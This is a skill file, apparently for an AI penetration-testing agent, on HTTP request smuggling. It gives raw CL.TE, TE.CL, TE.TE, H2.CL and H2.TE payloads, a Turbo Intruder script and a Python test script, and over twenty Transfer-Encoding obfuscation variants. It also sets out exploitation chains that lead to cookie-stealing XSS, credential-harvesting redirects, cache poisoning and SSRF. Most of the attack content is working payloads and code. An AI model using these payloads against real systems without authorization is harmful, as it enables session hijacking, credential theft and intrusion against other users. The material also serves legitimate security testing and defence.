---
name: http-smuggling
description: "HTTP Request Smuggling exploitation covering CL.TE, TE.CL, TE.TE, H2.CL, and H2.TE attack variants"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, measureTiming, compareResponses, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["http request smuggling", "http smuggling", "cl.te", "te.cl", "te.te", "transfer encoding", "content length", "http2 smuggling", "request splitting", "desync attack"]
contextBoosts: [api]
mitreAttack: ["T1190", "T1090"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# HTTP Request Smuggling

## When to Use

- Target uses a load balancer, reverse proxy, or CDN in front of an origin server
- Two or more HTTP devices process requests sequentially (front-end + back-end)
- You observe inconsistent Content-Length and Transfer-Encoding header handling
- HSTS or HTTP/2 is in play between client and front-end, with HTTP/1.1 back-end
- The target exhibits request desynchronization, timing anomalies, or orphaned responses

## Do Not Use

- Single-server architecture with no reverse proxy or load balancer
- HTTP/2 end-to-end with no protocol downgrade (both endpoints speak H2 natively)
- Target returns 400/501 for ambiguous Content-Length or Transfer-Encoding headers (strict parsing)
- When you only need classic injection — smuggling is for architectural layer attacks

## Auth Context

- Smuggled requests inherit the front-end's connection context, not your authenticated session
- If the front-end requires authentication on every request (no session persistence on keep-alive), smuggling cannot bypass auth directly
- However, smuggled requests can inject into other users' authenticated sessions on shared back-end connections
- Credential theft via smuggled responses requires the victim to share the same back-end connection as you

---

## Detection

### Timing Analysis

1. Send a request with both `Content-Length` and `Transfer-Encoding: chunked` headers
2. Measure response time — if the back-end waits for more data (TE processing), it may indicate CL.TE vulnerability
3. Send a CL-only request with a body shorter than Content-Length — if the server waits for more data, it prioritizes TE
4. Use `measureTiming` to record round-trip times across 10+ requests and compare baseline vs ambiguous requests

### Differential Responses

1. Send two identical requests but vary one header (e.g., `Content-Length: 0` vs `Content-Length: 1`)
2. Compare responses — if both return identical content, the front-end may be ignoring Content-Length
3. Use `compareResponses` to diff status codes, headers, and body length
4. Pay attention to `X-Request-ID` or `Via` header differences between front-end and back-end

### Header Reflection

1. Send a request containing a smuggled payload in the body
2. If the smuggled request appears in another user's response (reflected headers, partial HTML), smuggling succeeded
3. Use `getCapturedHeaders` to inspect header variations across repeated requests

### Detection Payload Template

```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

If the server processes this as two separate requests (returns content for `G` as a second request), it is vulnerable to CL.TE.

---

## CL.TE Smuggling

Content-Length tells the front-end one request size; Transfer-Encoding tells the back-end another. The front-end reads based on CL, leaves leftover bytes in the connection buffer, and the back-end processes those leftovers as a new request.

### Step-by-Step

1. Identify that the front-end uses Content-Length and the back-end uses Transfer-Encoding
2. Craft a request where Content-Length covers the smuggled payload but Transfer-Encoding terminates earlier (via `0\r\n\r\n`)
3. The smuggled request starts after the legitimate request body
4. The back-end reads the TE chunk, sees `0` (end of chunks), and the remaining bytes become the next request

### Payload Construction

```
POST /endpoint HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

SMUGGLED GET /admin HTTP/1.1
Host: target.com
```

- Content-Length = 44 (covers everything including the smuggled GET)
- Transfer-Encoding = chunked, terminates at `0\r\n\r\n`
- The `SMUGGLED GET` portion becomes a new request on the back-end

### Turbo Intruder Setup

```python
# turbo intruder CL.TE script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           connectionsPerHost=1,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    smuggled = 'SMUGGLED GET /admin HTTP/1.1\r\nHost: %s\r\n\r\n' % target.host
    # 0\r\n\r\n = end of TE chunk
    cl_value = 5 + 4 + len(smuggled) + 4 + 4  # "0\r\n\r\n" + smuggled + \r\n\r\n

    trigger = 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n%s' % (
        target.host, cl_value, smuggled)

    engine.queue(trigger, gate='open')
    engine.openGate('open')
    engine.iterate()

def handleResponse(req, interesting):
    if 'admin' in req.response:
        table.add(req)
```

---

## TE.CL Smuggling

Reverse of CL.TE: the front-end processes Transfer-Encoding, the back-end processes Content-Length. The front-end strips the TE header, leaving a request with only CL that undersizes the body, leaving smuggled bytes in the buffer.

### Step-by-Step

1. Identify that the front-end uses Transfer-Encoding and the back-end uses Content-Length
2. Craft a request with TE that terminates early, but CL is smaller than the actual body
3. The front-end sees the TE chunk end, forwards the request
4. The back-end uses CL, reads fewer bytes, and the remainder becomes a new request

### Payload

```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

- TE terminates at `0\r\n\r\n`
- CL says 3 bytes, but the actual body is much larger
- Back-end reads only 3 bytes (`8\r\n`), leaves `SMUGGLED\r\n0\r\n\r\n` as next request

### Chunked Encoding Tricks

- Use chunk extensions: `0\r\nx: y\r\n\r\n` — some parsers stop at the first semicolon, others ignore extensions
- Multiple `Transfer-Encoding` headers: `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` — some parsers use the last value, others use the first
- Trailing headers after the `0` chunk terminator can confuse parsers that expect immediate termination

---

## TE.TE Smuggling

Both front-end and back-end recognize Transfer-Encoding, but one of them can be tricked into misinterpreting the chunked encoding through obfuscation.

### Obfuscation Strategy

The goal is to make one device see `Transfer-Encoding: chunked` while the other does not.

### Common Tricks

```
Transfer-Encoding: x chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: chunked\t
Transfer-Encoding: chunked 
Transfer-Encoding:\tchunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

### Exploitation

1. Send a request with an obfuscated TE header that one parser recognizes and the other does not
2. If the front-end sees `Transfer-Encoding: x chunked` and strips it, but the back-end normalizes it to `chunked`, the smuggled payload is processed as TE
3. Combine with CL if needed — some configurations process both headers but apply them differently

---

## H2.CL Smuggling

Exploits the mismatch between HTTP/2 framing and HTTP/1.1 header parsing. HTTP/2 does not use Content-Length or Transfer-Encoding for framing — the body length is determined by the DATA frame length. When a front-end receives H2 and forwards to a back-end as HTTP/1.1, Content-Length in the H2 pseudo-headers may differ from the actual DATA frame payload.

### Step-by-Step

1. Confirm the front-end accepts HTTP/2 and forwards to an HTTP/1.1 back-end
2. Send an H2 request with `content-length` pseudo-header set to a small value but include a large DATA frame
3. The front-end forwards the request with the Content-Length header
4. The back-end processes based on Content-Length, reads fewer bytes, and the remainder becomes the next request

### Payload (via h2 or curl --http2)

```http
HEADERS:
  :method: POST
  :path: /
  :authority: target.com
  content-length: 5
  content-type: text/plain

DATA (length=50):
0

SMUGGLED GET /admin HTTP/1.1
Host: target.com
```

- The `content-length` pseudo-header says 5 bytes
- The DATA frame contains 50 bytes
- Back-end reads 5 bytes, leaves 45 bytes as the next request

---

## H2.TE Smuggling

Combines HTTP/2 front-end with TE smuggling on the back-end. Some H2 implementations strip or pass Transfer-Encoding headers, enabling CL.TE on the back-end even though the front-end spoke H2.

### Attack Flow

1. Send an H2 request that includes both `content-length` and `transfer-encoding` pseudo-headers
2. The H2 front-end may forward these as HTTP/1.1 headers
3. The HTTP/1.1 back-end sees the ambiguous headers and processes TE
4. The smuggled payload is chunked while the CL terminates the front-end's expected body

### Payload

```http
HEADERS:
  :method: POST
  :path: /
  :authority: target.com
  content-length: 5
  transfer-encoding: chunked

DATA (length=50):
0

SMUGGLED GET /admin HTTP/1.1
Host: target.com
```

---

## Transfer-Encoding Obfuscation — 20+ Variations

These variations test how different servers and proxies handle ambiguous or malformed Transfer-Encoding headers.

### Standard

```
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
```

### Case Variations

```
Transfer-Encoding: Chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: ChUnKeD
Transfer-Encoding: cHuNkEd
```

### Whitespace Manipulation

```
Transfer-Encoding:  chunked
Transfer-Encoding: chunked 
Transfer-Encoding:  chunked 
Transfer-Encoding :chunked
Transfer-Encoding : chunked
Transfer-Encoding:\tchunked
Transfer-Encoding:\t chunked
Transfer-Encoding: chunked\t
Transfer-Encoding: chunked\t\t
```

### Null Bytes and Non-Printable Characters

```
Transfer-Encoding: chunked\x00
Transfer-Encoding: chunked\x00\x00
Transfer-Encoding: \x00chunked
Transfer-Encoding: chunked\n
Transfer-Encoding: chunked\r\n
```

### Multiple Headers

```
Transfer-Encoding: chunked
Transfer-Encoding: identity
```
(Some parsers use the first, some use the last, some concatenate)

### Extended Chunk Extensions

```
Transfer-Encoding: chunked; x=1
Transfer-Encoding: chunked;x
Transfer-Encoding: chunked ;
Transfer-Encoding: chunked ; x=y
```

### Broken Encoding Names

```
Transfer-Encoding: chunk
Transfer-Encoding: chunkd
Transfer-Encoding: chunked1
Transfer-Encoding: _chunked
Transfer-Encoding: x-chunked
Transfer-Encoding: xchunked
```

### Validation

Use `httpRequest` to send each variation. Use `compareResponses` to diff the server's behavior. Record which variations cause the server to return different Content-Length, body size, or status codes — those indicate TE processing differences.

---

## Exploitation Chains

### Smuggling to XSS

1. Smuggle a request that injects controlled content into another user's response
2. Inject a script tag or event handler into a reflected parameter
3. The victim receives the smuggled response with the XSS payload, executing in their browser
4. Example: smuggle `POST /comment HTTP/1.1` with `<script>alert(document.cookie)</script>` in the body — the victim's next request to the same back-end connection receives the injected comment

### Smuggling to Credential Theft

1. Smuggle a request that redirects the victim to an attacker-controlled endpoint
2. Inject a 302 redirect with a Location header pointing to a credential-harvesting URL
3. The victim follows the redirect because it appears to come from the legitimate site
4. Combine with cache poisoning to persist the redirect

### Smuggling to Cache Poisoning

1. Smuggle a request that the back-end caches as a response to a legitimate URL
2. Inject malicious content (JavaScript, redirect) into the cached response
3. All subsequent requests to the poisoned URL receive the attacker's content
4. Effective on CDN-backed sites where the back-end response is cached by the front-end
5. Use `writeFinding` with severity=CRITICAL for cache poisoning chains

### Smuggling to SSRF

1. Smuggle a request to an internal endpoint that is not directly accessible
2. The back-end processes the smuggled request from its own loopback interface
3. Useful for reaching admin panels, metadata endpoints, or internal APIs

---

## Tools

### Burp Suite HTTP Request Smuggler

- Automated CL.TE, TE.CL, and TE.TE detection
- Sends probe requests and analyzes response timing and content
- Can confirm smuggling and demonstrate impact with PoC payloads
- Use the "Confirm" tab to verify vulnerability with injected responses

### Turbo Intruder

- High-performance request smuggling with precise timing control
- Python scripting for custom payloads and multi-step attacks
- Pipeline mode for sending multiple requests on the same connection
- Essential for H2.CL and H2.TE attacks where HTTP/2 framing is required

### Custom Python Scripts

```python
import http.client
import ssl

def test_cl_te(host, port, path="/"):
    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 44\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"SMUGGLED GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
    )
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=10)
    conn.send(payload.encode())
    resp = conn.getresponse()
    return resp.status, resp.read()
```

---

## Anti-Hallucination

- **Do not assume a vulnerability exists** based on timing alone — network latency, server processing time, and connection pooling can all cause timing variations without smuggling
- **Verify smuggling** by confirming that a smuggled request appears in a separate response or causes a detectable side effect (e.g., 404 for a non-existent path, 302 redirect)
- **Never claim successful smuggling** without evidence — the smuggled request must produce a verifiable result (new response, error, or content change)
- **Record exact payloads** used for each test — variations in whitespace, newlines, and header order can change results
- **One hypothesis at a time** — test CL.TE, then TE.CL, then TE.TE separately; do not combine multiple attack vectors in a single probe
- **Use `recordEvidence`** to store the exact request bytes and response for every test, including negative results
- **Ambiguous header handling varies** — a server that rejects `Transfer-Encoding: chunked` with a 400 error is not vulnerable; one that processes it normally may be
- **H2 attacks require HTTP/2 support** — verify the front-end accepts H2 with `curl --http2 -I https://target.com` before attempting H2.CL or H2.TE
- **Do not extrapolate** — if CL.TE works, do not assume TE.CL or H2.CL also works; each variant has independent prerequisites
